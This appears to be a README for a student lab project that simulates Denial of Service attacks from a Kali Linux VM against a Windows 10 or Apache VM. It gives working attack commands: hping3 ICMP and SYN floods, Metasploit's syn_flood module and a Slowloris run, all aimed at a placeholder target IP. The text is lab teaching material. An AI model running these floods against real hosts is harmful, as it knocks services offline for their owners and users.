# 🛡️ Simulation of DoS (Denial of Service) Attack

This project demonstrates the simulation of various **Denial of Service (DoS) attacks** in a controlled lab environment for **educational and cybersecurity research purposes**.  
The simulation uses **Kali Linux** as the attacker machine and **Windows 10** (and optional Apache Web Server) as the victim system, running inside **VMware Workstation**.

> ⚠ **Disclaimer**: This project is for **educational purposes only**.  
> Performing DoS attacks on unauthorized systems is illegal and punishable by law. Always conduct tests in a controlled lab environment with permission.

---

## 📌 Objectives
- Understand the working of DoS attacks.
- Simulate attacks using tools like:
  - `hping3`
  - `Metasploit`
  - `Slowloris`
  - `LOIC`
- Analyze the effect of DoS on target systems.
- Implement basic mitigation strategies.

---

## 🛠 Lab Setup

### **Requirements**
- **Hardware:**
  - PC with at least 8 GB RAM & virtualization support
- **Software:**
  - VMware Workstation / VirtualBox
  - Kali Linux ISO
  - Windows 10 ISO
  - Apache HTTP Server (optional, for web server attack simulation)
- **Tools Used:**
  - `hping3`
  - `msfconsole` (Metasploit Framework)
  - `slowloris`
  - `loic`

---

## ⚙️ Steps Performed

### **1. Lab Environment Configuration**
- Install VMware and create two VMs:
  - **Attacker VM**: Kali Linux
  - **Target VM**: Windows 10 or Linux with Apache
- Connect both VMs to the same network (Host-only or NAT).

### **2. Attacks Performed**
#### **a. ICMP Flood Attack (hping3)**
```bash
hping3 -1 --flood -V <target-ip>

#TCP SYN Flood (hping3)
hping3 -S -p 80 --flood -V <target-ip>


#Dos with metasploit
msfconsole
use auxiliary/dos/tcp/syn_flood
set RHOST <target-ip>
set RPORT 80
run

#HTTP DoS with Slowloris
perl slowloris.pl -dns <target-ip> -port 80 -timeout 200 -num 1000

